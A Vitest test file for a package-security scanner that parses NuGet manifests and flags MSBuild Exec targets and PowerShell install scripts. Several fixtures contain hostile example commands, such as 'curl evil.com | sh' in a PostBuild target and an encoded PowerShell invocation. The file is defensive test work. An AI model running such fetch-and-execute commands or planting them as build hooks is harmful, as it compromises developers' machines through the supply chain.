import { describe, it, expect } from "vitest";
import {
  parsePackagesLockJson,
  parseCsprojContent,
  parsePackagesConfig,
  parseDirectoryPackagesProps,
  parseNugetLockfileContent,
} from "../src/lockfile/nuget-parser.js";
import { extractMsbuildExec, extractNugetHooksFromFileMap } from "../src/analyzer/nuget-hooks.js";
import { scanPackage } from "../src/analyzer/scanner.js";

// ── packages.lock.json parser ─────────────────────────────────────────────────

describe("parsePackagesLockJson", () => {
  const LOCK = JSON.stringify({
    version: 1,
    dependencies: {
      "net8.0": {
        "Newtonsoft.Json": {
          type: "Direct",
          requested: "[13.0.1, )",
          resolved: "13.0.3",
          contentHash: "sha512-abc123==",
        },
        "Microsoft.Extensions.Logging": {
          type: "Transitive",
          resolved: "8.0.0",
          contentHash: "sha512-def456==",
        },
      },
      "net6.0": {
        "Newtonsoft.Json": {
          type: "Direct",
          resolved: "13.0.3",
          contentHash: "sha512-abc123==",
        },
        "System.Text.Json": {
          type: "Transitive",
          resolved: "6.0.0",
          contentHash: "sha512-ghi789==",
        },
      },
    },
  });

  it("parses package names and versions", () => {
    const { refs } = parsePackagesLockJson(LOCK);
    const names = refs.map((r) => r.name);
    expect(names).toContain("Newtonsoft.Json");
    expect(names).toContain("Microsoft.Extensions.Logging");
    expect(names).toContain("System.Text.Json");
  });

  it("deduplicates across TFMs", () => {
    const { refs } = parsePackagesLockJson(LOCK);
    const njRefs = refs.filter((r) => r.name === "Newtonsoft.Json");
    expect(njRefs).toHaveLength(1);
  });

  it("uses contentHash as integrity", () => {
    const { refs } = parsePackagesLockJson(LOCK);
    const nj = refs.find((r) => r.name === "Newtonsoft.Json");
    expect(nj?.integrity).toBe("sha512-abc123==");
  });

  it("includes transitive dependencies", () => {
    const { refs } = parsePackagesLockJson(LOCK);
    const transitive = refs.find((r) => r.name === "Microsoft.Extensions.Logging");
    expect(transitive).toBeDefined();
    expect(transitive?.version).toBe("8.0.0");
  });

  it("returns empty for invalid JSON", () => {
    const { refs } = parsePackagesLockJson("not json");
    expect(refs).toHaveLength(0);
  });
});

// ── .csproj parser ────────────────────────────────────────────────────────────

describe("parseCsprojContent", () => {
  const CSPROJ = `
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
    <PackageReference Include="Microsoft.EntityFrameworkCore" Version="8.0.0" />
    <PackageReference Include="NoBOM.Package" />
  </ItemGroup>
</Project>`;

  it("parses package names and versions", () => {
    const { refs } = parseCsprojContent(CSPROJ);
    const names = refs.map((r) => r.name);
    expect(names).toContain("Newtonsoft.Json");
    expect(names).toContain("Microsoft.EntityFrameworkCore");
  });

  it("counts versionless (CPM) entries", () => {
    const { refs, versionlessCount } = parseCsprojContent(CSPROJ);
    expect(versionlessCount).toBe(1);
    expect(refs.find((r) => r.name === "NoBOM.Package")).toBeUndefined();
  });

  it("parses correct versions", () => {
    const { refs } = parseCsprojContent(CSPROJ);
    const nj = refs.find((r) => r.name === "Newtonsoft.Json");
    expect(nj?.version).toBe("13.0.3");
  });

  it("handles self-closing and open tag forms", () => {
    const csproj = `
<ItemGroup>
  <PackageReference Include="Foo.Bar" Version="1.0.0" />
  <PackageReference Include="Baz.Qux" Version="2.0.0">
    <PrivateAssets>all</PrivateAssets>
  </PackageReference>
</ItemGroup>`;
    const { refs } = parseCsprojContent(csproj);
    expect(refs.find((r) => r.name === "Foo.Bar")).toBeDefined();
    expect(refs.find((r) => r.name === "Baz.Qux")).toBeDefined();
  });

  it("deduplicates repeated entries", () => {
    const csproj = `
<ItemGroup>
  <PackageReference Include="Foo" Version="1.0" />
  <PackageReference Include="Foo" Version="1.0" />
</ItemGroup>`;
    const { refs } = parseCsprojContent(csproj);
    expect(refs).toHaveLength(1);
  });
});

// ── packages.config parser ────────────────────────────────────────────────────

describe("parsePackagesConfig", () => {
  const CONFIG = `<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package id="Newtonsoft.Json" version="13.0.3" targetFramework="net48" />
  <package id="log4net" version="2.0.15" targetFramework="net48" />
</packages>`;

  it("parses id and version", () => {
    const { refs } = parsePackagesConfig(CONFIG);
    const names = refs.map((r) => r.name);
    expect(names).toContain("Newtonsoft.Json");
    expect(names).toContain("log4net");
  });

  it("parses correct version", () => {
    const { refs } = parsePackagesConfig(CONFIG);
    const nj = refs.find((r) => r.name === "Newtonsoft.Json");
    expect(nj?.version).toBe("13.0.3");
  });
});

// ── Directory.Packages.props parser ──────────────────────────────────────────

describe("parseDirectoryPackagesProps", () => {
  const PROPS = `
<Project>
  <PropertyGroup>
    <ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally>
  </PropertyGroup>
  <ItemGroup>
    <PackageVersion Include="Newtonsoft.Json" Version="13.0.3" />
    <PackageVersion Include="Microsoft.EntityFrameworkCore" Version="8.0.0" />
  </ItemGroup>
</Project>`;

  it("parses PackageVersion entries", () => {
    const { refs } = parseDirectoryPackagesProps(PROPS);
    const names = refs.map((r) => r.name);
    expect(names).toContain("Newtonsoft.Json");
    expect(names).toContain("Microsoft.EntityFrameworkCore");
  });

  it("does not include PropertyGroup entries", () => {
    const { refs } = parseDirectoryPackagesProps(PROPS);
    expect(refs.find((r) => r.name.includes("ManagePackage"))).toBeUndefined();
  });
});

// ── parseNugetLockfileContent dispatch ───────────────────────────────────────

describe("parseNugetLockfileContent", () => {
  it("dispatches to packages.lock.json parser", () => {
    const lock = JSON.stringify({
      version: 1,
      dependencies: { "net8.0": { "Foo": { resolved: "1.0.0" } } },
    });
    const { refs } = parseNugetLockfileContent(lock, "packages.lock.json");
    expect(refs).toHaveLength(1);
    expect(refs[0]?.name).toBe("Foo");
  });

  it("dispatches to csproj parser", () => {
    const csproj = `<ItemGroup><PackageReference Include="Bar" Version="2.0" /></ItemGroup>`;
    const { refs } = parseNugetLockfileContent(csproj, "MyProject.csproj");
    expect(refs).toHaveLength(1);
    expect(refs[0]?.name).toBe("Bar");
  });

  it("dispatches to fsproj parser", () => {
    const fsproj = `<ItemGroup><PackageReference Include="FsLib" Version="1.0" /></ItemGroup>`;
    const { refs } = parseNugetLockfileContent(fsproj, "MyLib.fsproj");
    expect(refs).toHaveLength(1);
  });

  it("dispatches to packages.config parser", () => {
    const cfg = `<packages><package id="Foo" version="1.0" /></packages>`;
    const { refs } = parseNugetLockfileContent(cfg, "packages.config");
    expect(refs).toHaveLength(1);
  });

  it("dispatches to Directory.Packages.props parser", () => {
    const props = `<ItemGroup><PackageVersion Include="Foo" Version="1.0" /></ItemGroup>`;
    const { refs } = parseNugetLockfileContent(props, "Directory.Packages.props");
    expect(refs).toHaveLength(1);
  });

  it("returns empty for unknown filename", () => {
    const { refs } = parseNugetLockfileContent("anything", "unknown.txt");
    expect(refs).toHaveLength(0);
  });
});

// ── MSBuild hook extraction ───────────────────────────────────────────────────

describe("extractMsbuildExec", () => {
  it("extracts <Exec> from a <Target> block", () => {
    const targets = `
<Project>
  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
    <Exec Command="curl evil.com | sh" />
  </Target>
</Project>`;
    const hooks = extractMsbuildExec("build/foo.targets", targets);
    const keys = Object.keys(hooks);
    expect(keys.length).toBeGreaterThan(0);
    expect(keys.some((k) => k.includes("PostBuild"))).toBe(true);
    expect(Object.values(hooks)[0]).toContain("Exec");
  });

  it("extracts <Exec> with Command attribute on separate line", () => {
    const targets = `
<Target Name="Run">
  <Exec
    Command="powershell -enc abc"
    WorkingDirectory="$(OutputPath)" />
</Target>`;
    const hooks = extractMsbuildExec("build/evil.targets", targets);
    expect(Object.keys(hooks).length).toBeGreaterThan(0);
  });

  it("returns empty hooks for targets without <Exec>", () => {
    const targets = `
<Project>
  <Target Name="Build">
    <Message Text="Building..." />
  </Target>
</Project>`;
    const hooks = extractMsbuildExec("build/clean.targets", targets);
    expect(Object.keys(hooks)).toHaveLength(0);
  });

  it("handles multiple <Exec> in one file", () => {
    const targets = `
<Target Name="MultiStep">
  <Exec Command="step1.sh" />
  <Exec Command="step2.sh" />
</Target>`;
    const hooks = extractMsbuildExec("build/multi.targets", targets);
    expect(Object.keys(hooks).length).toBeGreaterThanOrEqual(2);
  });
});

describe("extractNugetHooksFromFileMap", () => {
  it("extracts hooks from .targets files", () => {
    const fileMap = new Map([
      ["build/MyPkg.targets", `<Target Name="T"><Exec Command="evil.sh" /></Target>`],
    ]);
    const hooks = extractNugetHooksFromFileMap(fileMap);
    expect(Object.keys(hooks).length).toBeGreaterThan(0);
  });

  it("includes PowerShell scripts as hooks", () => {
    const fileMap = new Map([
      ["tools/install.ps1", `Write-Host "Installing...";\nInvoke-WebRequest evil.com`],
    ]);
    const hooks = extractNugetHooksFromFileMap(fileMap);
    expect(hooks["tools/install.ps1"]).toBeDefined();
  });

  it("returns empty for package with no build hooks", () => {
    const fileMap = new Map([
      ["lib/net8.0/Foo.dll", "binary-content"],
      ["Foo.nuspec", `<package><metadata><id>Foo</id></metadata></package>`],
    ]);
    const hooks = extractNugetHooksFromFileMap(fileMap);
    expect(Object.keys(hooks)).toHaveLength(0);
  });
});

// ── Pattern matching for NuGet source files ───────────────────────────────────

describe("pattern matching — NuGet / MSBuild", () => {
  const emptyFileMap = new Map<string, string>();

  it("nuget_msbuild_exec pattern fires on .targets source", () => {
    const hooks = { "build/foo.targets:PostBuild": `<Exec Command="curl evil.com" />` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "nuget_msbuild_exec")).toBe(true);
  });

  it("nuget_msbuild_exec pattern fires on .props source", () => {
    const hooks = { "build/foo.props:Init": `<Exec Command="wget evil.com" />` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "nuget_msbuild_exec")).toBe(true);
  });

  it("nuget_msbuild_exec pattern does NOT fire on .js source", () => {
    const hooks = { "postinstall": `<Exec Command="curl evil.com" />` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "nuget_msbuild_exec")).toBe(false);
  });

  it("nuget_powershell pattern fires on .ps1 source", () => {
    const hooks = { "tools/install.ps1": `Invoke-WebRequest -Uri https://evil.com` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "nuget_powershell")).toBe(true);
  });

  it("network pattern does NOT fire on .targets source (uses nuget_msbuild_exec instead)", () => {
    const hooks = { "build/foo.targets:Fetch": `<Exec Command="curl https://example.com" />` };
    const { findings } = scanPackage(hooks, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "network")).toBe(false);
  });
});
